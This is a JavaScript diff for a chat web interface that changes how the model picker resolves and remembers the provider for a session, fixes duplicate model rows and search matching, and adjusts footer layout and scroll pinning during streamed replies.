+    // is a real provider namespace (#1771), and stripping it would silently
+    // re-route the selection to the group's provider.
+    const effectiveProvider=routedProvider||explicitProvider;
+    const effectiveProviderLc=effectiveProvider.toLowerCase();
+    const isCustomProvider=effectiveProviderLc==='custom'||effectiveProviderLc.startsWith('custom:');
+    const explicitPrefix=`@${effectiveProvider}:`;
+    const valueCarriesPrefix=value.toLowerCase().startsWith(explicitPrefix.toLowerCase());
+    // Two ways the leading @<provider>: prefix is a genuine duplication we must
+    // strip:
+    //  (a) a custom provider's qualified id (#6884, and the value-encoded
+    //      variant where the option is missing from the catalog), or
+    //  (b) the dropdown rendered the option with a provider prefix that the
+    //      option's own metadata repeats (#7860: a non-default provider such
+    //      as @claude-subscription-…:claude-sonnet-5[1m] used to persist the
+    //      provider twice — once in `model`, once in `model_provider` — and
+    //      the upstream answered 404 Model-not-found).
+    // Anything else keeps the qualified form: a namespace like
+    // @safe:gpt-4o-mini is a real provider namespace and must be preserved
+    // (#1771). The account's configured default (window._defaultModel, e.g.
+    // "@safe:gpt-4o-mini") is the canonical standing default of the active
+    // provider — it is the session model on a missing/unknown-model fallback,
+    // not a catalog group's option, so it must NOT be stripped even though its
+    // own prefix happens to match the routed group provider.
+    const configuredDefault=(typeof window!=='undefined'&&window&&window._defaultModel)?String(window._defaultModel||'').trim():'';
+    const isConfiguredDefault=!!configuredDefault&&value.toLowerCase()===configuredDefault.toLowerCase();
+    // #7865 CORE (Codex): the second disjunct is gone. It stripped the
+    // @<provider>: prefix for ANY provider whose dropdown option carried one,
+    // on the reasoning that the prefix was then a duplication of
+    // model_provider. It is not: for a non-custom provider the qualified form is
+    // the session's model, and stripping it persisted the pair
+    // ``mistral-large`` / ``removed`` — a model id no provider owns plus a
+    // provider the account no longer has. The server fast path accepts that
+    // pair unchanged, and the installed Agent then raises
+    // ``AuthError: Unknown provider 'removed'`` on the next send, so a session
+    // whose provider was removed stopped recovering at all.
+    //
+    // Only a CUSTOM provider's qualified id is a genuine duplication: the
+    // custom namespace encodes the provider inside the model id itself, so
+    // keeping both repeats it and the upstream answers 404 Model-not-found.
+    // Non-custom @provider:model qualifiers stay in session state; stripping
+    // belongs at the native/Gateway provider-call boundaries, which is where it
+    // already happens.
+    const prefixIsDuplicated=!isConfiguredDefault&&isCustomProvider&&valueCarriesPrefix;
+    const strippedModel=prefixIsDuplicated
+      ?value.slice(explicitPrefix.length)
+      :value;
+    return {model:routedModel||strippedModel||value,model_provider:effectiveProvider};
   }
   // Resolve the provider from the option whose VALUE matches the requested
   // model — never blindly from sel.selectedOptions[0] (#5567). During a profile
@@ -3047,24 +3495,103 @@ function _captureModelDropdownSelection(sel){
   }catch(_){}
   return {model:String(sel.value||''),model_provider:null};
 }
+// #7860/#7865: the picker's own "the user picked this here" evidence, kept
+// SEPARATE from the _pendingSessionModel family (that one is consumed by send()
+// and gone after the first turn). The send-path precedence needs the opposite
+// lifetime: a marker that says "the dropdown selection was authored by the user
+// for THIS session, after this session loaded", so a matching dropdown option
+// may override a loaded session's provider. Without it, any selection that the
+// catalog repaint leaves in the box (e.g. session restore syncs the topbar
+// before the catalog refresh — sessions.js ~2535 — and another provider's
+// identically-valued option ends up selected) would hijack the provider.
+function _pickerExplicitPickKey(sessionId){
+  return 'hermes-webui-explicit-picker-pick:'+String(sessionId||'');
+}
+function _rememberExplicitPickerPick(sessionId, value, provider){
+  const sid=String(sessionId||'').trim();
+  const val=String(value||'').trim();
+  if(!sid||!val) return;
+  try{
+    sessionStorage.setItem(_pickerExplicitPickKey(sid), JSON.stringify({
+      value:val,
+      model_provider:provider?String(provider):null,
+    }));
+  }catch(_){}
+}
+function _readExplicitPickerPick(sessionId){
+  const sid=String(sessionId||'').trim();
+  if(!sid) return null;
+  try{
+    const raw=sessionStorage.getItem(_pickerExplicitPickKey(sid));
+    if(!raw) return null;
+    const parsed=JSON.parse(raw);
+    const value=String(parsed&&parsed.value||'').trim();
+    if(!value) return null;
+    return {
+      value,
+      model_provider:parsed&&parsed.model_provider?String(parsed.model_provider):null,
+    };
+  }catch(_){
+    return null;
+  }
+}
+function _clearExplicitPickerPick(sessionId){
+  const sid=String(sessionId||'').trim();
+  if(!sid) return;
+  try{sessionStorage.removeItem(_pickerExplicitPickKey(sid));}catch(_){}
+}
 function _modelProviderForSend(modelId){
-  const sessionProvider=(S&&S.session&&S.session.model_provider)||null;
-  if(sessionProvider) return sessionProvider;
   const model=String(modelId||'').trim();
   if(!model) return null;
+  // An explicit provider embedded in a qualified id (@provider:model) is
+  // authoritative. (#7860, unchanged)
   const explicitProvider=typeof _providerFromModelValue==='function'
     ? _providerFromModelValue(model)
     : '';
   if(explicitProvider) return explicitProvider;
+  // The dropdown's option provider may win over a loaded session's provider
+  // ONLY with evidence the user picked in the dropdown for THIS session —
+  // the session-scoped explicit-pick marker written by the picker's change
+  // handler. A bare dropdown match alone is NOT evidence: after a session
+  // restore the catalog repaint can leave another provider's identically-
+  // valued option selected (e.g. gpt-5.5 offered by both OpenAI and OpenAI
+  // Codex), and letting that win routes the turn to a provider the user
+  // never picked (#7865, maintainer-flagged CORE regression). Always scoped
+  // to the ACTIVE session so a marker left over from another session can't
+  // authorize an override here.
   const sel=typeof $==='function' ? $('modelSelect') : null;
-  if(sel&&String(sel.value||'').trim()===model&&typeof _modelStateForSelect==='function'){
+  const activeSid=(S&&S.session&&S.session.session_id)||null;
+  const sessionProvider=(S&&S.session&&S.session.model_provider)||null;
+  const pick=(typeof _readExplicitPickerPick==='function')
+    ? _readExplicitPickerPick(activeSid)
+    : null;
+  // The gate only guards the session's own provider: without a loaded session
+  // provider there is nothing to protect, and master's behavior (the dropdown
+  // wins when its option matches the sent model) is preserved for the empty
+  // composer / new-session case.
+  if(sel&&(!sessionProvider||pick)&&String(sel.value||'').trim()===model
+     &&(!pick||String(pick.value||'').trim()===model)
+     &&typeof _modelStateForSelect==='function'){
     try{
       const dropdownState=_modelStateForSelect(sel,sel.value);
       if(dropdownState&&String(dropdownState.model||'').trim()===model){
-        return dropdownState.model_provider||null;
+        const dropdownProvider=dropdownState.model_provider;
+        // #7865: the marker is evidence of WHICH option the user picked, not
+        // just that some pick happened. A stale marker (surviving a reload, see
+        // the loadSession target-sid clear) authorizes the dropdown only when
+        // the option now selected is still the very provider that was picked.
+        // If the catalog repaint left a different provider's identically-valued
+        // option selected (gpt-5.5 offered by both openai and openai-codex),
+        // the pick must NOT authorize that wrong provider — fall through to the
+        // session's own provider instead.
+        const pickProvider=pick?String(pick.model_provider||'').trim().toLowerCase():'';
+        const dropdownProviderLc=String(dropdownProvider||'').trim().toLowerCase();
+        const pickAuthorizes=!pick||!!dropdownProviderLc&&!!pickProvider&&pickProvider===dropdownProviderLc;
+        if(dropdownProvider&&pickAuthorizes) return dropdownProvider;
       }
     }catch(_){}
   }
+  if(sessionProvider) return sessionProvider;
   if(typeof _readPersistedModelState==='function'){
     try{
       const persisted=_readPersistedModelState();
@@ -3865,11 +4392,21 @@ function _normalizeConfiguredModelKey(modelId){
 function _isEquivalentConfiguredModelEntry(modelId,badge,entries){
   const normalized=_normalizeConfiguredModelKey(modelId);
   const provider=String(badge&&badge.provider||'').toLowerCase();
+  // A row synthesized from an ungrouped top-level OPTION (temporary/custom
+  // entries added by _ensureModelOptionInDropdown) is stored with providerId:''
+  // even when the option carries provider identity, so that row's provider
+  // authority has to fall back to its badge provider (same fallback already
+  // used by _modelProviderForSelectedBadge below). Without it neither the
+  // same-normalized fast path nor the routed spellings can see the row as
+  // belonging to that provider (#7290).
+  const _entryProvider=(entry)=>String(
+    (entry&&entry.providerId)||(entry&&entry.badge&&entry.badge.provider)||''
+  ).toLowerCase();
   const matchingEntries=(entries||[]).filter(existing=>
     _normalizeConfiguredModelKey(existing.value)===normalized
   );
   if(matchingEntries.some(existing=>{
-    const entryProvider=String(existing.providerId||'').toLowerCase();
+    const entryProvider=_entryProvider(existing);
     return !provider||!entryProvider||entryProvider===provider;
   })) return true;
   // @provider:model is an equivalent routing spelling only when an existing
@@ -3877,11 +4414,32 @@ function _isEquivalentConfiguredModelEntry(modelId,badge,entries){
   // providers (@custom:name:model) without collapsing matching model IDs from
   // different providers.
   const rawId=String(modelId||'');
+  // `<provider>/<model>` is another routing spelling of `<model>`, so its badge
+  // key must not become a second picker row. configured_model_badges holds every
+  // spelling of a configured model and renderModelDropdown() synthesises a row
+  // for each key this predicate does not recognise. The provider-qualified
+  // spelling was missed because _normalizeConfiguredModelKey() strips only one
+  // leading slash segment (#3360 keeps `vendor_a/x` and `vendor_b/y/x` distinct),
+  // so `acme/example-model` and `custom/acme/example-model` normalise to
+  // different keys and the picker lists one model twice.
+  // Match it the way the `@provider:` rule below does: the badge declares a
+  // provider, the key starts with that provider's `<provider>/` prefix, and an
+  // existing row from the same provider normalises equal to the remainder. Two
+  // different models never satisfy the last clause, so this can only drop a
+  // duplicate of a row the catalog already produced.
+  const slashPrefix=provider?`${provider}/`:'';
+  if(slashPrefix&&rawId.toLowerCase().startsWith(slashPrefix)){
+    const slashRoutedId=rawId.slice(slashPrefix.length);
+    if(slashRoutedId&&(entries||[]).some(entry=>
+      _entryProvider(entry)===provider
+      &&_normalizeConfiguredModelKey(entry.value)===_normalizeConfiguredModelKey(slashRoutedId)
+    )) return true;
+  }
   const prefix=provider?`@${provider}:`:'';
   if(!prefix||!rawId.toLowerCase().startsWith(prefix)) return false;
   const routedId=rawId.slice(prefix.length);
   return (entries||[]).some(entry=>
-    String(entry.providerId||'').toLowerCase()===provider
+    _entryProvider(entry)===provider
     &&_normalizeConfiguredModelKey(entry.value)===_normalizeConfiguredModelKey(routedId)
   );
 }
@@ -4326,7 +4884,15 @@ function renderModelDropdown(){
       const displayName=rawValue.startsWith('@custom:')
         ? getModelLabel(rawValue)
         : (child.textContent||getModelLabel(rawValue));
-      _modelData.push({value:child.value,name:esc(displayName),id:esc(child.value),group:'',groupKey,providerId:'',badge:_getConfiguredModelBadge(child.value,_badgeMap),hiddenByDefault:false});
+      // Keep the option's own provider authority: _ensureModelOptionInDropdown
+      // stamps dataset.provider on the temporary options it adds, and that
+      // authority has to reach both places later comparisons read (the
+      // structural providerId and the configured badge lookup). Storing
+      // providerId:'' here let a badge-owned `@commandcode:model-a` row claim
+      // providerless authority and suppress another provider's
+      // same-normalized configured entries (#7290).
+      const optionProviderId=_getOptionProviderId(child);
+      _modelData.push({value:child.value,name:esc(displayName),id:esc(child.value),group:'',groupKey,providerId:optionProviderId,badge:_getConfiguredModelBadge(child.value,_badgeMap,optionProviderId),hiddenByDefault:false});
       _groupMeta.get(groupKey).modelCount++;
     }
   }
@@ -4337,6 +4903,10 @@ function renderModelDropdown(){
       name:esc(getModelLabel(modelId)),
       id:esc(modelId),
       group:'',
+      // Stamp the badge provider onto the appended row so its provider
+      // authority is structural here instead of depending on the badge
+      // fallback later (#7290).
+      providerId:String((badge&&badge.provider)||''),
       badge,
     });
   }
@@ -4372,7 +4942,23 @@ function renderModelDropdown(){
     const _provider=String((m&&m.providerId)||(m&&m.badge&&m.badge.provider)||((typeof _providerFromModelValue==='function')?_providerFromModelValue(m&&m.value):'')||'').trim();
     return (_provider&&_provider!=='default')?_provider:null;
   };
-  const _isSelectedModelRow=(m)=>String((m&&m.value)||'')===String((_selectedModelState&&_selectedModelState.model)||(sel&&sel.value)||'')&&String(_modelProviderForSelectedBadge(m)||'')===String((_selectedModelState&&_selectedModelState.model_provider)||'');
+  const _isSelectedModelRow=(m)=>{
+    const _rowModel=String((m&&m.value)||'');
+    const _rowProvider=String(_modelProviderForSelectedBadge(m)||'');
+    const _stateModel=String((_selectedModelState&&_selectedModelState.model)||(sel&&sel.value)||'');
+    const _stateProvider=String((_selectedModelState&&_selectedModelState.model_provider)||'');
+    // Normalize both sides to the same model/provider identity. Catalog rows
+    // carry the qualified @custom:<slug>:<model> value while the outgoing
+    // state model is bare (#6884) — a raw string comparison would leave no
+    // row marked active/"Selected" after a restore. _modelPickerOptionIdentity
+    // is the same identity used for picker dedup, so the row that survives is
+    // exactly the one the send path resolves.
+    const _norm=(model,provider)=>typeof _modelPickerOptionIdentity==='function'
+      ?_modelPickerOptionIdentity(model,provider)
+      :String(model||'');
+    return _norm(_rowModel,_rowProvider)===_norm(_stateModel,_stateProvider)
+      &&_rowProvider===_stateProvider;
+  };
   const _selectedModelBadge=(m)=>_isSelectedModelRow(m)
     ?`<span class="model-opt-badge model-opt-badge--selected">${esc(t('model_badge_selected')||'Selected')}</span>`
     :'';
@@ -4531,10 +5117,16 @@ function renderModelDropdown(){
     else if(_prevHasSearch){ for(const k in _groupOpenState) delete _groupOpenState[k]; }
     _prevHasSearch=hasSearch;
     const found=new Set();
+    // Fold whitespace/hyphens/dots on both sides so "ox alpha", "ox-alpha" and
+    // "ox.alpha" all match the same model (OpenRouter display names use spaces,
+    // ids use slashes/hyphens) (#7228).
+    const _foldModelSearch=(s)=>String(s||'').toLowerCase().replace(/[\s._-]+/g,'');
+    const foldTerm=_foldModelSearch(term);
     for(const m of _modelData){
       const name=m.name.toLowerCase();
       const id=m.id.toLowerCase();
-      if(name.includes(term)||id.includes(term)){
+      if(name.includes(term)||id.includes(term)
+         ||(foldTerm&&(_foldModelSearch(name).includes(foldTerm)||_foldModelSearch(id).includes(foldTerm)))){
         found.add(m.value);
       }
     }
@@ -4597,19 +5189,17 @@ function renderModelDropdown(){
         const row=document.createElement('div');
         row.className='model-opt'+(_isSelectedModelRow(m)?' active':'');
         let badgeLabel = '';
-        let modelName = m.name;
         if (m.badge) {
           // 直接用badge的原始key（即config.yaml里的ID）
           const rawId = badgeKeyMap.get(m.badge) || m.value || m.badge.label || 'Configured';
           badgeLabel = rawId;
-          modelName = rawId; // model-opt-name直接用原始ID
           if(m.badge.provider){
             const providerName=m.badge.provider.replace(/^custom:/,'').split('/')[0];
             badgeLabel += ` (${providerName})`;
           }
         }
         const badgeHtml=m.badge?`<span class="model-opt-badge model-opt-badge--${esc(m.badge.role||'configured')}">${esc(badgeLabel)}</span>`:'';
-        row.innerHTML=`<div class="model-opt-top"><span class="model-opt-name">${esc(modelName)}</span>${badgeHtml}${_selectedModelBadge(m)}</div><span class="model-opt-id">${esc(m.id)}</span>`;
+        row.innerHTML=`<div class="model-opt-top"><span class="model-opt-name">${m.name}</span>${badgeHtml}${_selectedModelBadge(m)}</div><span class="model-opt-id">${esc(m.id)}</span>`;
         row.onclick=()=>selectFromDropdown(m.value,(m.badge&&m.badge.provider)||m.providerId||null);
         dd.appendChild(row);
       }
@@ -5023,11 +5613,41 @@ function _fitComposerFooter(){
   if(!left) return;
   if(!left.clientWidth) return;
   const overflows=function(){return left.scrollWidth>left.clientWidth+1;};
-  footer.classList.remove('cf-icons','cf-burger');
-  if(!overflows()) return;
-  footer.classList.add('cf-icons');
-  if(!overflows()) return;
-  footer.classList.add('cf-burger');
+  // Measure without ever PAINTING the expanded state. Stripping the stage
+  // classes makes the footer briefly full-width, which grows the composer and
+  // shrinks #messages by a few px; restoring them a moment later shrinks it
+  // back. A pinned reader sees that as a vertical up/down jitter on every
+  // fit pass (and fit passes run on each context-indicator update during SSE).
+  // `visibility:hidden` + a fixed height freeze the layout box during the
+  // measurement, so the scroll container's clientHeight never changes.
+  const prevVisibility=footer.style.visibility;
+  const prevHeight=footer.style.height;
+  const frozenHeight=footer.getBoundingClientRect().height;
+  if(frozenHeight>0){
+    footer.style.height=frozenHeight+'px';
+    footer.style.visibility='hidden';
+  }
+  let next='';
+  try{
+    footer.classList.remove('cf-icons','cf-burger');
+    if(overflows()){
+      footer.classList.add('cf-icons');
+      next='cf-icons';
+      if(overflows()){
+        footer.classList.add('cf-burger');
+        next='cf-icons cf-burger';
+      }
+    }
+  }finally{
+    // Restore the measured stage, then release the frozen box in the same
+    // task so no intermediate geometry is ever committed to the screen.
+    footer.classList.toggle('cf-icons',next.includes('cf-icons'));
+    footer.classList.toggle('cf-burger',next.includes('cf-burger'));
+    if(frozenHeight>0){
+      footer.style.height=prevHeight;
+      footer.style.visibility=prevVisibility;
+    }
+  }
 }
 window._fitComposerFooter=_fitComposerFooter;
 
@@ -5915,6 +6535,16 @@ function _cancelMessageJumpScroll(){
 let _nearBottomCount=0;
 let _lastScrollTop=null;
 let _lastMessageClientHeight=null;   // #4702: track scroller height to ignore iOS portrait toolbar-settle reflows (a clientHeight increase fires a scroll event with decreased scrollTop that is NOT a user scroll)
+// Fast-stream shrink-clamp guard: track scrollHeight between scroll events.
+// During high-throughput streaming (200+ tok/s), content ABOVE the tail can
+// re-render SHORTER (live thinking block replaced by shorter final block, tool
+// output collapsing into a compact card, provisional markdown re-parse). When
+// scrollHeight shrinks, the browser clamps scrollTop down and fires a scroll
+// event that reads as "moved up" — with NO user input. The movedUp branch then
+// sticky-unpins and live-follow silently dies mid-stream, stranding the
+// viewport mid-transcript. Sibling of the #4702 clientHeight-grew guard: both
+// are geometry changes masquerading as user scrolls.
+let _lastMessageScrollHeight=null;
 // Sticky-unpin model (#3343 supersedes #3330's proximity re-pin): once the user
 // scrolls up, streaming stops auto-following until they return to the bottom or
 // click ↓. The upward-intent TIMEOUT mechanism (_lastMessageUpwardIntentMs /
@@ -5927,6 +6557,63 @@ let _messageUserUnpinned=false;
 // A monotonic ownership token lets delayed restores distinguish reader input
 // that happened after a snapshot from input that merely happened recently.
 let _messageScrollInputGeneration=0;
+// Capture the tail geometry at the reader input itself, before the browser
+// applies that wheel/touch/key/drag. A later scroll callback may observe a
+// taller streaming transcript, so event-to-event scrollHeight is not authority
+// for the tail the reader was actually aiming at.
+let _messageScrollInputTailHeight=null;
+let _messageScrollInputTailGeneration=0;
+let _messageScrollInputTailConsumedGeneration=0;
+function _captureMessageScrollInputTail(el){
+  _messageScrollInputGeneration++;
+  _messageScrollInputTailGeneration=_messageScrollInputGeneration;
+  _messageScrollInputTailHeight=el&&Number.isFinite(Number(el.scrollHeight))
+    ? Number(el.scrollHeight)
+    : null;
+}
+// The input tail is re-pin AUTHORITY, so it must describe input that actually
+// scrolls the transcript. Nested scroll surfaces — tool output panes, code
+// blocks, approval command views — sit inside the transcript but own their own
+// scrolling. Wheel/touch/key input consumed there never moves the transcript,
+// so a capture taken for it would sit unconsumed until a later layout-driven
+// downward transcript scroll consumed it and falsely re-pinned an intentionally
+// unpinned reader (#7494 review: Nested Input Leaves Stale Authority). Walk the
+// target's ancestors: a vertical scroller between the target and the transcript
+// scroller consumes the gesture, so only bare transcript targets capture —
+// UNLESS that scroller is pinned at the boundary in the gesture's direction and
+// the browser chains the gesture onward to the transcript itself (#7494 review:
+// Boundary Gestures Lose Re-Pinning). A downward gesture (deltaY>0 wheel, or a
+// touchmove whose finger moved UP past the pane's bottom boundary) passes
+// through such a pane and lands on the transcript, so it must retain capture.
+// The transcript scroller's own wheel/touch handler never suppresses chaining,
+// so a gesture that reached it still scrolls it regardless of its own position.
+function _isTranscriptScrollTarget(node,el,dir){
+  if(!node) return false;
+  let n=node;
+  while(n&&n!==el){
+    if(Number(n.scrollHeight)>Number(n.clientHeight)+1){
+      const cs=(typeof getComputedStyle==='function')?getComputedStyle(n):null;
+      const oy=cs?String(cs.overflowY||''):'';
+      if(oy==='auto'||oy==='scroll'){
+        // Direction-aware boundary chaining: the pane consumes the gesture
+        // only when it can actually scroll it (not pinned at the boundary in
+        // the gesture direction, within the same 1px epsilon used above).
+        // Default dir (0/undefined) stays strictly consumed: a keyboard
+        // focus-scroll into a mid-scroll pane chains nothing, and the
+        // capture-suppression contract fails closed.
+        if(!(dir>0
+          ?n.scrollTop>=n.scrollHeight-n.clientHeight-1
+          :dir<0&&n.scrollTop<=1)) return false;
+        // A nested pane with its own overscroll boundary does not chain into
+        // .messages even when it cannot scroll farther in this direction.
+        const boundary=cs?String(cs.overscrollBehaviorY||''):'';
+        if(boundary==='contain'||boundary==='none') return false;
+      }
+    }
+    n=n.parentElement;
+  }
+  return n===el;
+}
 let _bottomSettleToken=0;
 let _settleRAF=0;
 let _settleRO=null;
@@ -6017,7 +6704,22 @@ function _recordNonMessageScrollIntent(e){
   const guardedWheelUp=wheelUp&&_freshProgrammaticScrollActive();
   const jumpScrollOwned=typeof _messageJumpScrollOwner!=='undefined'&&!!_messageJumpScrollOwner;
   if(e.type==='touchmove'||(typeof e.deltaY==='number'&&e.deltaY!==0)){
-    if(typeof _messageScrollInputGeneration==='number') _messageScrollInputGeneration++;
+    // Direction of the gesture in transcript coordinates: deltaY>0 = scroll
+    // down toward the tail. For touch, scrolling down = the finger moves UP
+    // (clientY decreases), so dy<0 maps to dir +1; dy>0 is upward intent.
+    let dir=0;
+    if(typeof e.deltaY==='number'&&e.deltaY!==0) dir=e.deltaY>0?1:-1;
+    else if(_touchStartY!==null&&e.touches&&e.touches[0]){
+      const dy=e.touches[0].clientY-_touchStartY;
+      if(dy<-2) dir=1;
+      else if(dy>2) dir=-1;
+    }
+    // Nested-pane consumed input must not mint re-pin authority: gate the
+    // capture on the event target actually scrolling the transcript (#7494).
+    // A pane pinned at the gesture's boundary chains the gesture to the
+    // transcript, so it must not swallow the capture (#7494, Boundary
+    // Gestures Lose Re-Pinning).
+    if(_isTranscriptScrollTarget(target,el,dir)) _captureMessageScrollInputTail(el);
     if(jumpScrollOwned||e.type==='touchmove'||(typeof e.deltaY==='number'&&e.deltaY< -30)||guardedWheelUp){
       if(typeof _cancelBottomSettle==='function') _cancelBottomSettle();
     }
@@ -6132,6 +6834,9 @@ function _resetScrollDirectionTracker(){
   _clearNewMessageScrollCue();
   _lastScrollTop=null;
   _lastMessageClientHeight=null;
+  _lastMessageScrollHeight=null;
+  _messageScrollInputTailHeight=null;
+  _messageScrollInputTailConsumedGeneration=_messageScrollInputTailGeneration;
   _messageUserUnpinned=false;
   _scrollPinned=true;
   _nearBottomCount=0;
@@ -6160,6 +6865,9 @@ function _resetStreamScrollFollow(){
   _scrollPinned=true;
   _nearBottomCount=0;
   _lastScrollTop=null;
+  _lastMessageScrollHeight=null;
+  _messageScrollInputTailHeight=null;
+  _messageScrollInputTailConsumedGeneration=_messageScrollInputTailGeneration;
   // #4970 review: clear low-delta wheel intent on fresh stream start too, else a
   // gentle upward wheel within the prior 1200ms can under-suppress a genuine
   // no-intent render artifact and silently disable live follow for the new stream.
@@ -6248,7 +6956,9 @@ if(typeof window!=='undefined'){
     if(e.target===el&&e.offsetX>=el.clientWidth){
       if(typeof _cancelBottomSettle==='function') _cancelBottomSettle();
       _scrollbarDragActive=true;
-      if(typeof _messageScrollInputGeneration==='number') _messageScrollInputGeneration++;
+      // The scrollbar belongs to the transcript itself: drag input always
+      // targets the transcript scroll surface (#7494).
+      if(typeof _captureMessageScrollInputTail==='function') _captureMessageScrollInputTail(el);
     }
   },{passive:true});
   window.addEventListener('pointerup',()=>{
@@ -6296,7 +7006,23 @@ if(typeof window!=='undefined'){
     if(a===el||el.contains(a)||el.matches(':hover')){
       if(typeof _cancelBottomSettle==='function') _cancelBottomSettle();
       const now=performance.now();
-      if(typeof _messageScrollInputGeneration==='number') _messageScrollInputGeneration++;
+      // Nested-pane focus (tool output, code block) consumes scroll keys —
+      // such a keydown must not mint transcript re-pin authority (#7494).
+      // Resolve the key target first: when focus is on <body> but the pointer
+      // hovers the transcript, walking `a` starts outside `el` and never
+      // reaches it, so the gate would return false and a queued live-render
+      // restore would undo this scroll (#7494 re-gate).
+      const keyTarget = el.contains(a) ? a : el;
+      // Keyboard direction mirrors the browser's own key semantics: PageUp,
+      // ArrowUp, Home and Shift+Space scroll UP; every other key in this set
+      // scrolls DOWN. The nested-pane boundary check is direction-aware, so a
+      // direction-less gate would strictly consume a nested pane even when it
+      // is pinned at the boundary and the browser chains the key onward to the
+      // transcript — the scroll would land but its re-pin authority would not
+      // (#7494 re-gate: PageDown from a nested pane's boundary was undone by
+      // the queued live-render restore).
+      const keyDir=(e.key==='PageUp'||e.key==='ArrowUp'||e.key==='Home'||((e.key===' '||e.key==='Spacebar')&&e.shiftKey))?-1:1;
+      if(_isTranscriptScrollTarget(keyTarget,el,keyDir)) _captureMessageScrollInputTail(el);
       _lastMessageKeyScrollIntentMs=now;
       const bottomDistance=el.scrollHeight-el.scrollTop-el.clientHeight;
       if(bottomDistance>120) _lastMessageScrollIntentMs=now;
@@ -6304,12 +7030,12 @@ if(typeof window!=='undefined'){
   },{capture:true,passive:true});
   let _scrollRaf=0;
   el.addEventListener('scroll',()=>{
-    _scheduleMessageVirtualizedRender();
     if(_messageJumpScrollOwner){
       _scheduleMessageJumpScrollReconcile(_messageJumpScrollOwner.generation);
       return;
     }
     if(_freshProgrammaticScrollActive()) return;
+    _scheduleMessageVirtualizedRender();
     _markMessageVirtualScrollActive();
     cancelAnimationFrame(_scrollRaf);
     _scrollRaf=requestAnimationFrame(()=>{
@@ -6326,8 +7052,40 @@ if(typeof window!=='undefined'){
       // false and behavior is byte-identical.
       const grew=_lastMessageClientHeight!==null&&el.clientHeight>_lastMessageClientHeight+1;
       _lastMessageClientHeight=el.clientHeight;
-      const movedUp=!grew&&_lastScrollTop!==null&&top<_lastScrollTop-2;
+      // Fast-stream shrink-clamp: scrollHeight shrank since the last scroll
+      // event AND there is no recent user scroll input of any kind (wheel,
+      // keyboard, touch, scrollbar drag). The browser clamped scrollTop after
+      // content above the tail re-rendered shorter — NOT a user scroll. Treat
+      // like `grew`: never read it as movedUp. Real user scrolls keep their
+      // 2px trigger because any actual input stamps one of the intent trackers.
+      const shrankNoIntent=typeof _lastMessageScrollHeight!=='undefined'
+        &&_lastScrollTop!==null
+        &&_lastMessageScrollHeight!==null
+        &&el.scrollHeight<_lastMessageScrollHeight-1
+        &&(typeof _scrollbarDragActive==='undefined'||!_scrollbarDragActive)
+        &&typeof _recentMessageTouchScrollIntent==='function'&&!_recentMessageTouchScrollIntent()
+        &&typeof _recentMessageWheelIntent==='function'&&!_recentMessageWheelIntent()
+        &&typeof _recentMessageKeyScrollIntent==='function'&&!_recentMessageKeyScrollIntent()
+        &&typeof _recentNonMessageScrollIntent==='function'&&!_recentNonMessageScrollIntent();
+      if(typeof _lastMessageScrollHeight!=='undefined') _lastMessageScrollHeight=el.scrollHeight;
+      const movedUp=!grew&&!shrankNoIntent&&_lastScrollTop!==null&&top<_lastScrollTop-2;
       const movedDown=_lastScrollTop!==null&&top>_lastScrollTop+2;
+      // Fast-stream re-pin race: bind the target tail to the actual reader
+      // input, not to the prior scroll callback. Streaming can add arbitrary
+      // height between callbacks; only the wheel/touch/key/drag capture says
+      // which tail the reader was aiming at. Consume each input generation once
+      // so a later programmatic/layout scroll cannot reuse stale authority.
+      const inputTailGeneration=(typeof _messageScrollInputTailGeneration==='number')
+        ?_messageScrollInputTailGeneration:0;
+      const hasUnconsumedInputTail=typeof _messageScrollInputTailConsumedGeneration==='number'
+        &&inputTailGeneration>_messageScrollInputTailConsumedGeneration;
+      const inputTailHeightForRepin=hasUnconsumedInputTail
+        &&typeof _messageScrollInputTailHeight==='number'
+        ?_messageScrollInputTailHeight:null;
+      if(hasUnconsumedInputTail) _messageScrollInputTailConsumedGeneration=inputTailGeneration;
+      const caughtInputTail=movedDown
+        &&inputTailHeightForRepin!==null
+        &&(top+el.clientHeight)>=(inputTailHeightForRepin-80);
       // Suppress the post-render scroll artifact: right after renderMessages()
       // rebuilds #msgInner, the browser can emit a non-user upward scroll event.
       // The typeof guards keep this branch inert in unit harnesses that inject
@@ -6359,12 +7117,24 @@ if(typeof window!=='undefined'){
         return;
       }
       _lastScrollTop=top;
-      if(movedUp){
+      if(movedUp&&bottomDistance>1){
+        // Only a real scroll-away unpins. A true-bottom geometry clamp keeps
+        // bottomDistance <= 1; even gentle reader input leaves that boundary.
         _cancelBottomSettle();
         _nearBottomCount=0;
         _scrollPinned=false;
         _messageUserUnpinned=true;
-      }else if(movedDown&&nearBottom){
+      }else if(movedDown&&(nearBottom||caughtInputTail)){
+        // Catching the INPUT-CAPTURED tail is decisive: re-pin immediately (no
+        // debounce — at fast stream rates a second qualifying event may never
+        // come, because each handler run re-measures against a taller
+        // transcript) and snap to the true bottom so follow resumes cleanly.
+        if(caughtInputTail){
+          _nearBottomCount=0;
+          _messageUserUnpinned=false;
+          _scrollPinned=true;
+          if(typeof window!=='undefined'&&window._autoScrollFollow&&typeof _setMessageScrollToBottom==='function') _setMessageScrollToBottom();
+        }else{
         _nearBottomCount=_nearBottomCount+1;
         if(_nearBottomCount>=2){
           // Only re-pin when the reader has genuinely reached the true bottom
@@ -6376,6 +7146,7 @@ if(typeof window!=='undefined'){
             _scrollPinned=true;
           }
           _nearBottomCount=0;
+        }
         }
       }else if(!_messageUserUnpinned){
         if(nearBottom){
@@ -7192,7 +7963,6 @@ function scrollIfPinned(){
   }
   if(!_scrollPinned) return;
   if(_recentNonMessageScrollIntent()) return;
-  if(_messageBottomDistance()>500) _setMessageScrollToBottom();
   _settleMessageScrollToBottom(false);
 }
 function scrollToBottom(){
@@ -7277,18 +8047,51 @@ function _stripDottedModelPrefix(bare){
 function getModelLabel(modelId){
   if(!modelId) return 'Unknown';
   const rawId=String(modelId||'');
-  // Preserve custom gateway model IDs exactly as configured.
+  // The catalog is the authority on model identity: the backend knows the real
+  // provider/model split and ships an exact `m.label` per routing id, so a
+  // catalogued id — including a plain-lane `@custom:` id whose model contains
+  // colons (`@custom:ollamacloud/qwen3.5:397b`) — renders verbatim. The
+  // string parsing below is only a legacy fallback for ids the catalog has
+  // never seen (pre-hydration, stale sessions, removed providers), where a
+  // first-colon split alone cannot tell a `@custom:<slug>:<model>` from a
+  // plain-lane `@custom:<model-with-colon>` (#7240).
+  if(_dynamicModelLabels[modelId]) return _dynamicModelLabels[modelId];
+  // Preserve custom gateway model IDs exactly as configured. A custom id is
